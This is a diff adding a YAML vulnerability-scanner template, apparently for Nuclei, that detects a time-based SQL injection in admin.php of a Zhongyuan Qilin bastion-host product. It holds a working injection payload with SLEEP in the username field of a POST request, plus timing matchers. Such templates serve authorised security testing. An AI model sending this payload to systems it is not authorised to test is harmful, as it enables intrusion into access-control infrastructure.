@@ -1,0 +1,32 @@
+id: poc-yaml-zyql-bastion-host-admin-php-sqli
+info:
+  name: 中远麒麟堡垒机 admin.php SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 1}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/admin.php?controller=admin_commonuser"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      username=admin' AND (SELECT 12 FROM (SELECT(SLEEP({{t1}})))ptGN) AND 'AAdm'='AAdm
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "username and password does not match!"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
